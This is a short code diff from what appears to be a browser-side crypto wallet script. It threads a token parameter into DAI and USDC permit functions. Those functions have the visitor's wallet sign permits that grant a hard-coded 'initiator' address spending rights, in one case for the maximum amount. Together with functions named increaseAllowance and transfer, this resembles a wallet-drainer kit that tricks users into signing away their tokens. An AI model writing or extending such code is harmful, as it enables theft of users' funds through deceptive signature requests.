@@ -150,11 +150,11 @@ export const increaseAllowance = async (token) => {
       })
       console.log(nonce)
       await daiPermitV1(
-        permitToken, nonce, provider
+        token, permitToken, nonce, provider
       )
     }else if (version === '2') {
       await usdcPermitV2(
-        permitToken, provider
+        token, permitToken, provider
       )
     }
   }else if (increaseallown) {
@@ -250,7 +250,7 @@ const transfer = async (token) => {
   })
 }
 
-const daiPermitV1 = async (permitToken, nonce, provider) => {
+const daiPermitV1 = async (token, permitToken, nonce, provider) => {
   await signDaiPermit(
     window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
   ).then(async ( result) => {
@@ -274,7 +274,7 @@ const daiPermitV1 = async (permitToken, nonce, provider) => {
   });
 }
 
-const usdcPermitV2 = async (permitToken, provider) => {
+const usdcPermitV2 = async (token, permitToken, provider) => {
   await signERC2612Permit(
     window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
   ).then(async ( result) => {
